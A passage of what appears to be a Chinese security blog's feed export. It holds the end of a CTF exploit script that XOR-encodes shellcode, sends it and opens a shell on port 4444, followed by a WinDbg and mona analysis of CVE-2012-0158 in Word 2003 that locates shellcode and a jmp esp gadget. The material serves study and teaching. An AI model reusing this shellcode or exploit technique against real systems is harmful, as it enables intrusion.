class=&quot;line&quot;&gt;payload += &amp;quot;\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x53\xff\xd5&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# xor encode payload&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload = xor(table, payload, cut=&amp;quot;right&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.sendline(&amp;quot;ENCRYPT &amp;#123;&amp;#125;&amp;#123;&amp;#125;&amp;quot;.format(p16(len(payload)), payload))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# close the connection&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.close()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# interact with shell&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn = remote(HOST, 4444)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.success(&amp;quot;enjoy :)&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.interactive(prompt=&amp;quot;&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.close()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2015/09/28/nsctf-bin-1500-3.png&quot; alt=&quot;图 3&quot;&gt;&lt;br&gt;小 tip：这题做题是只要求弹出计算器，所以没必要构造完整的 ROP，利用程序自带的开新进程就可以达到题目要求。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;实战中体验了次 DEP &amp;amp; ASLR 的绕过。&lt;/p&gt;
&lt;h2 id=&quot;Fuzz-溢出点&quot;&gt;&lt;a href=&quot;#Fuzz-溢出点&quot; class=&quot;headerlink&quot; title=&quot;Fuzz 溢出点&quot;&gt;&lt;/a&gt;Fuzz 溢出点&lt;/h2&gt;&lt;p&gt;题目里只给了个 PE 程序，运行程序后 &lt;code&gt;netstat -anbp tcp&lt;/code&gt; 可以看到程序正在监听 2994 端口。PEiD 查看发现是 AsPack 的壳，&lt;code&gt;ESP 定律&lt;/code&gt; 脱壳后丢到 IDA 中搜索欢迎信息（&lt;code&gt;shift F12&lt;/code&gt;），F5 得到如下伪代码：
    
    </summary>
    
      <category term="Exploit" scheme="http://sh3ll.me/categories/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2012-0158 漏洞分析</title>
    <link href="http://sh3ll.me/2015/09/19/CVE-2012-0158/"/>
    <id>http://sh3ll.me/2015/09/19/CVE-2012-0158/</id>
    <published>2015-09-19T02:33:52.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;这个漏洞分析了几天才搞懂，实战与做实验区别还是很大的。&lt;/p&gt;
&lt;h2 id=&quot;漏洞概要&quot;&gt;&lt;a href=&quot;#漏洞概要&quot; class=&quot;headerlink&quot; title=&quot;漏洞概要&quot;&gt;&lt;/a&gt;漏洞概要&lt;/h2&gt;&lt;p&gt;此漏洞是一个栈溢出漏洞，是由于 Microsoft Windows Common Controls 的 MSCOMCTL.TreeView、MSCOMCTL.ListView2、MSCOMCTL.TreeView2、MSCOMCTL.ListView 控件（MSCOMCTL.OCX）中存在错误，可被利用破坏内存，导致任意代码执行。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;分析环境&quot;&gt;&lt;a href=&quot;#分析环境&quot; class=&quot;headerlink&quot; title=&quot;分析环境&quot;&gt;&lt;/a&gt;分析环境&lt;/h2&gt;&lt;p&gt;OS：Windows XP SP3&lt;br&gt;Debugger：WinDbg&lt;br&gt;Target：Mircrosoft Office Word 2003（11.5604.5606）&lt;/p&gt;
&lt;h2 id=&quot;定位-shellcode&quot;&gt;&lt;a href=&quot;#定位-shellcode&quot; class=&quot;headerlink&quot; title=&quot;定位 shellcode&quot;&gt;&lt;/a&gt;定位 shellcode&lt;/h2&gt;&lt;p&gt;拿到手的是一枚 msf 生成的 POC（exec calc）。考虑到 POC 运行后调用 calc.exe，所以首先选在 kernel32.WinExec 处下断点：&lt;code&gt;bp kernel32!WinExec&lt;/code&gt;。&lt;br&gt;运行程序，不出意料地程序断在了 WinExec 处，先来查看下 WinExec 的参数：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; kb L3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ChildEBP RetAddr  Args to Child              &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00120960 001218e6 00121905 00000001 00000000 kernel32!WinExec&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;WARNING: Frame IP not in any known module. Following frames may be wrong.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121853 508b64c0 0c528b30 8b14528b b70f2872 &amp;lt;Unloaded_dui.DLL&amp;gt;+0x1218c5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121857 0c528b30 8b14528b b70f2872 ff31264a 0x508b64c0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; db 121905 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121905  63 61 6c 63 00 00 00 00-00 00 00 00 00 00 00 00  calc............&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121915  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121925  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121935  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121945  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121955  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121965  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121975  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;确实调用的是 calc。&lt;/p&gt;
&lt;p&gt;因为大部分 shellcode 附近都会有一段滑行区（&lt;code&gt;\x90\x90\x90\x90&lt;/code&gt;），所以这里直接在栈中搜索 &lt;code&gt;\x90\x90\x90\x90&lt;/code&gt; 快速定位 shellcode：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; !py mona find -type bin -b 120000 -t 130000 -s 90909090&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Hold on...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Command used:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;!py mona.py find -type bin -b 120000 -t 130000 -s 90909090&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;---------- Mona command started on 2015-09-19 11:02:35 (v2.0, rev 562) ----------&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Processing arguments and criteria&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    - Pointer access level : *&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    - Treating search pattern as bin&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Searching from 0x00120000 to 0x00130000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Preparing output file &amp;apos;find.txt&amp;apos;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    - (Re)setting logfile C:\Documents and Settings\chu\....\mona_logs\WINWORD\find.txt&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Generating module info table, hang on...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    - Processing modules&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    - Done. Let&amp;apos;s rock &amp;apos;n roll.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Writing results to C:\Documents and Settings\chu\....\mona_logs\WINWORD\find.txt&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    - Number of pointers of type &amp;apos;90909090&amp;apos; : 2 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Results : &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0x00121710 |   0x00121710 : 90909090 | startnull,ascii &amp;#123;PAGE_READWRITE&amp;#125; [Stack] &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0x00121714 |   0x00121714 : 90909090 | startnull,ascii &amp;#123;PAGE_READWRITE&amp;#125; [Stack] &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Found a total of 2 pointers&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] This mona.py action took 0:00:00.562000&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;查看滑行区附近发现了 0x7c86467b（&lt;code&gt;jmp esp&lt;/code&gt;）：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; dd 121710-20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;001216f0  0a0c0810 6a626f43 00000064 00008282&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121700  00000000 00000000 00000000 7c86467b&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121710  90909090 90909090 9849993f 41469348&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121720  90974f97 97489797 fd969697 47414099&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121730  96f9d6f8 98d699f8 fd97f8fd f94849f5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121740  423f4840 963f4090 fd4a993f 92484fd6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121750  4ff9419b 99924727 97494b49 f593903f&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00121760  42974240 f9929949 2f3f4e4e 963f3790&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;对比 poc 文件我们可以确定这就是 shellcode，查看该段内存属性：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; !py mona info -a 121710&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Hold on...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Command used:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;!py mona.py info -a 121710&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Generating module info table, hang on...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    - Processing modules&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    - Done. Let&amp;apos;s rock &amp;apos;n roll.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] NtGlobalFlag: 0x00000070&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    0x00000040 : +hpc - Enable Heap Parameter Checking&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    0x00000020 : +hfc - Enable Heap Free Checking&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    0x00000010 : +htc - Enable Heap Tail Checking&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Information about address 0x00121710&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    startnull,ascii &amp;#123;PAGE_READWRITE&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Address is part of page 0x00106000 - 0x00130000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    This address is in a stack segment  (Thread 0x000007f0, Stack Base : 0x00106000, Stack Top : 0x00130000)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Module: None&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Disassembly:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Instruction at 00121710 : NOP&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Output of !address 0x00121710:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    00030000 : 00106000 - 0002a000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    Type     00020000 MEM_PRIVATE&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    Protect  00000004 PAGE_READWRITE&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    State    00001000 MEM_COMMIT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    Usage    RegionUsageStack&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    Pid.Tid  7cc.7f0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] This mona.py action took 0:00:00.625000&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;shellcode 处于栈中，内存属性为 PAGE_READWRITE，所以如果实际利用中为求稳定需要考虑绕过 DEP。&lt;/p&gt;
&lt;h2 id=&quot;确定函数调用关系&quot;&gt;&lt;a href=&quot;#确定函数调用关系&quot; class=&quot;headerlink&quot; title=&quot;确定函数调用关系&quot;&gt;&lt;/a&gt;确定函数调用关系&lt;/h2&gt;&lt;p&gt;根据网上的资料已知此漏洞是 MSCOMCTL.OCX 控件的问题，故设置一个加载断点：&lt;code&gt;sxe ld:MSCOMCTL.OCX&lt;/code&gt;，并在 0x7c86467b 处设置断点。&lt;br&gt;程序中断在加载处后，单步一段后发现就触发了 &lt;code&gt;jmp esp&lt;/code&gt;，在 Command 窗口中可以看到最近调用的函数如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; p&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eax=08dda94c ebx=01cb2338 ecx=275a3518 edx=08dda8f8 esi=00000000 edi=01cb2350&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eip=301ecdca esp=0012181c ebp=001218a8 iopl=0         nv up ei pl zr na pe nc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;winword+0x1ecdca:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;301ecdca ff5118          call    dword ptr [ecx+18h]  ds:0023:275a3530=276008d9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; p&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Breakpoint 0 hit&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eax=00000000 ebx=0a6f0810 ecx=7c93003d edx=00140608 esi=08dad0c4 edi=00000000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;eip=7c86467b esp=00121718 ebp=00000000 iopl=0         nv up ei pl zr na pe nc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kernel32!UnhandledExceptionFilter+0x7fc:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7c86467b ffe4            jmp     esp &amp;#123;&amp;lt;Unloaded_dui.DLL&amp;gt;+0x1216d7 (00121718)&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;查看 276008d9 处信息：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;0:000&amp;gt; !py mona info -a 276008d9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Hold on...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Command used:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;!py mona.py info -a 276008d9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Generating module info table, hang on...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    - Processing modules&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    - Done. Let&amp;apos;s rock &amp;apos;n roll.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] NtGlobalFlag: 0x00000070&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    0x00000040 : +hpc - Enable Heap Parameter Checking&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    0x00000020 : +hfc - Enable Heap Free Checking&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    0x00000010 : +htc - Enable Heap Tail Checking&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Information about address 0x276008d9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Address is part of page 0x27581000 - 0x2762d000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Section : .text&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Address is part of a module:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    [MSCOMCTL.OCX] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.1.95.45 (C:\WINDOWS\system32\MSCOMCTL.OCX)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Offset from module base: 0x808d9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Disassembly:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Instruction at 276008d9 : PUSH EBP&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Output of !address 0x276008d9:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    27580000 : 27581000 - 000ac000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    Type     01000000 MEM_IMAGE&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    Protect  00000020 PAGE_EXECUTE_READ&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    State    00001000 MEM_COMMIT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    Usage    RegionUsageImage&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    FullPath C:\WINDOWS\system32\MSCOMCTL.OCX&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] This mona.py action took 0:00:20.188000&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
